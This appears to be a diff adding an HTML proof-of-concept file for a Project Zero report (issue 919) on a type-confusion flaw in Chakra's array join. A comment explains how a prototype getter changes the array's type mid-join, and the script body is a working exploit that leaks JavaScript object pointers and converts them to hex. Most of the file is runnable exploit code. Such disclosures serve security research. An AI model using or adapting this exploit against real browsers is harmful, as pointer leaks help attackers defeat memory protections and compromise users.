@@ -1,0 +1,67 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=919
+
+When an array is joined in Chakra, it calls JavascriptArray::JoinArrayHelper, a function that is templated based on the type of the array. This function then calls JavascriptArray::TemplatedGetItem to get each item in the array. If an element is missing from the array, this function will fall back to the array object's prototype, which could contain a getter or a proxy, allowing user script to be executed. This script can have side effects, including changing the type of the array, however JoinArrayHelper will continue running as it's templated type even if this has happened. This can allow object pointers in an array to be read as integers and accessed by a malicious script.
+
+A minimal PoC is as follows:
+
+
+var t = new Array(1,2,3);
+t.length = 100;
+var o = {};
+  Object.defineProperty(o, '3', {
+    get: function() {
+
+      t[0] = {};
+      for(var i = 0; i < 100; i++){
+          t[i] = {a : i};
+      }
+      return 7;
+    }
+  });
+
+t.__proto__ = o;
+
+var j = [];
+var s = j.join.call(t);
+alert(s);
+
+A full PoC is attached. One of the alert dialogs contains pointers to JavaScript objects.
+-->
+
+<html><body><script>
+
+var y = 0;
+var t = new Array(1,2,3);
+t.length = 100;
+var o = {};
+  Object.defineProperty(o, '3', {
+    get: function() {
+      alert('get!');
+      t[0] = {};
+      var j = [];
+      for(var i = 0; i < 100; i++){
+          t[i] = {a : i};
+      }
+      return 7;
+    }
+  });
+
+t.__proto__ = o;
+
+var j = [];
+var s = j.join.call(t);
+alert(s);
+var a = s.split(",");
+var h = [];
+for(item in a){
+	var n = parseInt(a[item]);
+     if (n < 0){
+		n = n + 0x100000000;
+     }
+	var ss = n.toString(16);
+      h.push(ss);
+}
+alert(h);
+
+</script></body></html>
